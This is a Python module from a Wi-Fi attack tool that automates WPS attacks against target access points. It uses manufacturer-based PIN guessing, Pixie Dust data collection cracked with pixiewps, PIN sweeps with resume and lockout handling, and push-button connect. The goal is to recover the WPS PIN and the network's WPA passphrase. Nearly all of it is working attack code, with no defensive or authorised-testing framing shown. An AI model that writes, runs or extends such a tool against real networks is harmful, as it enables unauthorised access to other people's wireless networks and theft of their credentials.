#!/usr/bin/env python3
"""
Attack Module v3 - Direct WPS Engine (no ose.py needed)
Uses WpsEngine directly instead of running ose.py as subprocess
"""

import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from modules.wps_pins import suggest_pins, detect_manufacturer
from modules.wpa_engine import WpsEngine

LOGS_DIR = Path(__file__).parent.parent / "logs"
LOGS_DIR.mkdir(parents=True, exist_ok=True)


def _extract_attempted_pins(attempts):
    pins = set()
    for attempt in attempts:
        pin = attempt.get("pin")
        if pin:
            pins.add(pin)
    return pins


def _result_status(result, default="completed"):
    if not isinstance(result, dict):
        return default
    status = result.get("status")
    if status:
        return status
    return default


def _is_real_success(result):
    if not isinstance(result, dict):
        return False
    if result.get("status") != "success":
        return False
    if not result.get("psk"):
        return False
    if result.get("attempted_pin") == "PBC":
        return True
    return bool(result.get("pin"))


def analyze_target(bssid, wps_version="", wps_locked="Unknown"):
    """Analyze target and return smart PIN suggestions"""
    manufacturer, algo, confidence = detect_manufacturer(bssid)
    pins = suggest_pins(bssid, wps_version, wps_locked)

    analysis = {
        "bssid": bssid,
        "manufacturer": manufacturer or "Unknown",
        "algorithm": algo or "generic",
        "confidence": confidence,
        "pins": pins[:10],
        "best_pin": pins[0]["pin"] if pins else "12345670",
        "total_pins": len(pins),
    }

    return analysis


def run_wps_attack(interface, attack_type, bssid=None, pin=None, callback=None,
                   skip_pins=None):
    """
    Run WPS attack using direct WpsEngine (no ose.py).

    Attack types:
      - "pin": WPS PIN attack with specific PIN
      - "pixie": Pixie Dust data collection + crack
      - "bruteforce": Controlled sweep of suggested PINs via WpsEngine
      - "pbc": Push Button Connect
      - "smart": Uses best PIN from analysis
    """
    if attack_type == "smart" and bssid and not pin:
        analysis = analyze_target(bssid)
        pin = analysis["best_pin"]
        if callback and analysis["pins"]:
            callback(
                "[*] Smart PIN selected: {pin} ({method})".format(
                    pin=pin,
                    method=analysis["pins"][0]["method"],
                )
            )

    found_pin = None
    found_psk = None
    output_lines = []
    attempt_records = []
    skipped_pins = set(skip_pins or [])
    final_status = "completed"
    final_attempted_pin = pin
    log_file = LOGS_DIR / "attack_{ts}.log".format(
        ts=datetime.now().strftime("%Y%m%d_%H%M%S"))

    def cb(message):
        output_lines.append(message)
        if callback:
            callback(message)

    engine = WpsEngine(interface)
    ok, message = engine.start()

    if not ok:
        cb("[!] Engine error: " + message)
        return {
            "pin": None,
            "attempted_pin": pin,
            "psk": None,
            "status": "error",
            "output": message,
            "log_file": str(log_file),
            "attempts": [],
        }

    engine.callback = cb

    with open(log_file, "w") as handle:
        handle.write("[*] Attack started: {value}\n".format(
            value=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ))
        handle.write("[*] Interface: {iface} | Type: {atype} | BSSID: {bssid}\n".format(
            iface=interface,
            atype=attack_type,
            bssid=bssid or "any",
        ))

    try:
        if attack_type == "pin" and pin:
            cb("[*] Trying PIN: " + pin)
            started = time.time()
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
            elapsed = time.time() - started
            attempt_records.append({
                "pin": pin,
                "status": result.get("status", "unknown"),
                "response": result.get("output", "")[-500:],
                "duration": elapsed,
            })
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin") or pin
            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")

        elif attack_type == "pixie":
            cb("[*] Collecting Pixie Dust data...")
            result = engine.collect_pixie_data(
                bssid,
                max_attempts=8,
                skip_pins=skipped_pins,
            )
            attempt_records.extend(result.get("attempts", []))
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin")

            pixie = result.get("pixie_data", {})
            collected = sum(
                1 for key in [
                    "PKE", "PKR", "E_NONCE", "R_NONCE",
                    "AUTHKEY", "E_HASH1", "E_HASH2",
                ]
                if pixie.get(key)
            )

            if collected >= 4 and pixie.get("PKE"):
                cb("[*] Running pixiewps with {count}/7 data fields...".format(
                    count=collected
                ))
                import shutil
                if shutil.which("pixiewps"):
                    import subprocess
                    cmd = [
                        "pixiewps",
                        "--pke", pixie.get("PKE", ""),
                        "--pkr", pixie.get("PKR", ""),
                        "--e-hash1", pixie.get("E_HASH1", ""),
                        "--e-hash2", pixie.get("E_HASH2", ""),
                        "--authkey", pixie.get("AUTHKEY", ""),
                        "--e-nonce", pixie.get("E_NONCE", ""),
                        "--r-nonce", pixie.get("R_NONCE", ""),
                        "--e-bssid", bssid.replace(":", ""),
                        "--mode", "1,2,3,4,5",
                    ]
                    cmd = [value for value in cmd if value and not value.isspace()]
                    try:
                        run_result = subprocess.run(
                            cmd,
                            capture_output=True,
                            text=True,
                            timeout=120,
                        )
                        output_lines.append(run_result.stdout)
                        for line in run_result.stdout.split("\n"):
                            if "WPS pin" in line and "[+]" in line:
                                extracted_pin = line.split(":")[-1].strip()
                                if extracted_pin and extracted_pin != "<empty>":
                                    cb("[*] PIXIEWPS candidate PIN: " + extracted_pin)
                                    cb("[*] Verifying candidate PIN...")
                                    verify_started = time.time()
                                    verify_result = engine.wps_pin_attack(
                                        bssid,
                                        extracted_pin,
                                        timeout=45,
                                    )
                                    verify_elapsed = time.time() - verify_started
                                    attempt_records.append({
                                        "pin": extracted_pin,
                                        "status": verify_result.get("status", "unknown"),
                                        "response": verify_result.get("output", "")[-500:],
                                        "duration": verify_elapsed,
                                    })
                                    final_status = _result_status(verify_result, final_status)
                                    final_attempted_pin = (
                                        verify_result.get("attempted_pin") or
                                        extracted_pin
                                    )
                                    if _is_real_success(verify_result):
                                        found_pin = verify_result.get("pin")
                                        found_psk = verify_result.get("psk")
                                        cb("[+] PIN VERIFIED!")
                                        break
                    except Exception as exc:
                        cb("[!] pixiewps error: " + str(exc))
                else:
                    cb("[!] pixiewps not installed")
            else:
                cb("[!] Not enough data for pixiewps ({count}/7)".format(
                    count=collected
                ))

            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")
                final_status = "success"
                final_attempted_pin = result.get("attempted_pin")

        elif attack_type == "bruteforce":
            analysis = analyze_target(bssid)
            all_pins = []
            for pin_info in analysis["pins"]:
                candidate = pin_info["pin"]
                if candidate not in all_pins:
                    all_pins.append(candidate)
            pending_pins = [
                candidate for candidate in all_pins
                if candidate not in skipped_pins
            ]
            cb("[*] Suggested PIN sweep: {pending} pending, {skipped} already tried".format(
                pending=len(pending_pins),
                skipped=len(all_pins) - len(pending_pins),
            ))
            if not pending_pins:
                cb("[*] Resume database says all suggested PINs were already tried")
            for index, try_pin in enumerate(pending_pins, 1):
                cb("[{index}/{count}] Trying PIN: {pin}".format(
                    index=index,
                    count=len(pending_pins),
                    pin=try_pin,
                ))
                started = time.time()
                result = engine.wps_pin_attack(bssid, try_pin, timeout=30)
                elapsed = time.time() - started
                attempt_records.append({
                    "pin": try_pin,
                    "status": result.get("status", "unknown"),
                    "response": result.get("output", "")[-500:],
                    "duration": elapsed,
                })
                final_status = _result_status(result)
                final_attempted_pin = result.get("attempted_pin") or try_pin
                if _is_real_success(result):
                    found_pin = result.get("pin")
                    found_psk = result.get("psk")
                    cb("[+] SUCCESS! PIN: {pin} PSK: {psk}".format(
                        pin=found_pin,
                        psk=found_psk,
                    ))
                    break
                if result.get("status") == "locked":
                    cb("[!] AP reports WPS locked. Stopping sweep.")
                    break
                if result.get("status") == "m2d_rejected":
                    cb("[!] AP rejected or deferred the session (M2D). Stopping sweep.")
                    break
                if result.get("is_locked"):
                    final_status = "locked"
                    cb("[!] AP locked after this attempt.")
                    break
            else:
                if len(pending_pins) > 1:
                    final_status = "completed"
                elif pending_pins:
                    final_status = attempt_records[-1].get("status", "completed")

        elif attack_type == "pbc":
            cb("[*] WPS PBC - press the button on the router!")
            result = engine.wps_pbc_attack(bssid, timeout=120)
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin")
            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")

        else:
            if not pin:
                pin = "12345670"
            cb("[*] Trying PIN: " + pin)
            started = time.time()
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
            elapsed = time.time() - started
            attempt_records.append({
                "pin": pin,
                "status": result.get("status", "unknown"),
                "response": result.get("output", "")[-500:],
                "duration": elapsed,
            })
            final_status = _result_status(result)
            final_attempted_pin = result.get("attempted_pin") or pin
            if _is_real_success(result):
                found_pin = result.get("pin")
                found_psk = result.get("psk")

    except KeyboardInterrupt:
        cb("[!] Interrupted by user")
        result = engine._result() if hasattr(engine, "_result") else {}
        final_status = _result_status(result, "stopped")
        final_attempted_pin = result.get("attempted_pin") or final_attempted_pin

    finally:
        engine.stop()

    if final_status != "success":
        found_pin = None
        found_psk = None

    with open(log_file, "a") as handle:
        handle.write("\n" + "=" * 50 + "\n")
        handle.write("Status: {status}\n".format(status=final_status))
        if found_pin:
            handle.write("PIN: {value}\n".format(value=found_pin))
        if found_psk:
            handle.write("PSK: {value}\n".format(value=found_psk))
        if final_attempted_pin:
            handle.write("Attempted PIN: {value}\n".format(value=final_attempted_pin))
        for line in output_lines[-20:]:
            handle.write(line + "\n")

    return {
        "pin": found_pin,
        "attempted_pin": final_attempted_pin,
        "psk": found_psk,
        "status": final_status,
        "output": "\n".join(output_lines),
        "log_file": str(log_file),
        "attempts": attempt_records,
    }


def run_smart_attack(interface, bssid, wps_version="",
                     wps_locked="Unknown", callback=None, skip_pins=None):
    """
    Smart attack sequence using direct WpsEngine:
    1. Try best algorithm PIN first
    2. Try Pixie Dust collection / verification
    3. Fall back to top 3 PINs
    """
    analysis = analyze_target(bssid, wps_version, wps_locked)
    combined_attempts = []
    tried_pins = set(skip_pins or [])
    last_result = {
        "pin": None,
        "attempted_pin": None,
        "psk": None,
        "status": "completed",
        "output": "",
        "log_file": "",
        "attempts": [],
    }

    if callback:
        callback("\n" + "=" * 50)
        callback("SMART ATTACK ANALYSIS")
        callback("=" * 50)
        callback("Target:   " + bssid)
        callback("MFR:      " + str(analysis["manufacturer"]))
        callback("Algorithm:" + str(analysis["algorithm"]))
        callback("Best PIN: " + str(analysis["best_pin"]))
        callback("Confidence: " + str(analysis["confidence"]) + "%")
        if tried_pins:
            callback("Resume:   skipping {count} previously tried PINs".format(
                count=len(tried_pins)
            ))
        callback("=" * 50)

    best_pin = analysis["best_pin"]
    if best_pin in tried_pins:
        if callback:
            callback("\n[*] Step 1: Skipping best PIN already tried: " + best_pin)
    else:
        if callback:
            callback("\n[*] Step 1: Trying best PIN: " + best_pin)
        last_result = run_wps_attack(interface, "pin", bssid, best_pin, callback)
        combined_attempts.extend(last_result.get("attempts", []))
        tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
        if last_result["status"] == "success":
            last_result["attempts"] = combined_attempts
            return last_result
        if last_result["status"] in ("locked", "m2d_rejected"):
            last_result["attempts"] = combined_attempts
            return last_result

    if callback:
        callback("\n[*] Step 2: Trying Pixie Dust...")
    last_result = run_wps_attack(
        interface,
        "pixie",
        bssid,
        None,
        callback,
        skip_pins=tried_pins,
    )
    combined_attempts.extend(last_result.get("attempts", []))
    tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
    if last_result["status"] == "success":
        last_result["attempts"] = combined_attempts
        return last_result
    if last_result["status"] in ("locked", "m2d_rejected"):
        last_result["attempts"] = combined_attempts
        return last_result

    step_index = 0
    for pin_info in analysis["pins"][:3]:
        candidate_pin = pin_info["pin"]
        if candidate_pin == best_pin:
            continue
        if candidate_pin in tried_pins:
            if callback:
                callback("\n[*] Step 3: Skipping already tried PIN: {pin}".format(
                    pin=candidate_pin
                ))
            continue
        step_index += 1
        if callback:
            callback("\n[*] Step 3.{index}: Trying {pin} ({method})".format(
                index=step_index,
                pin=candidate_pin,
                method=pin_info["method"],
            ))
        last_result = run_wps_attack(interface, "pin", bssid, candidate_pin, callback)
        combined_attempts.extend(last_result.get("attempts", []))
        tried_pins.update(_extract_attempted_pins(last_result.get("attempts", [])))
        if last_result["status"] == "success":
            last_result["attempts"] = combined_attempts
            return last_result
        if last_result["status"] in ("locked", "m2d_rejected"):
            last_result["attempts"] = combined_attempts
            return last_result

    if callback:
        callback("\n[*] Smart attack completed. No credentials found.")
        callback("[*] Suggested PINs exhausted. Check WPS lock/rate limiting.")

    last_result["attempts"] = combined_attempts
    if not combined_attempts and last_result.get("status") == "completed":
        last_result["attempted_pin"] = None
    return last_result
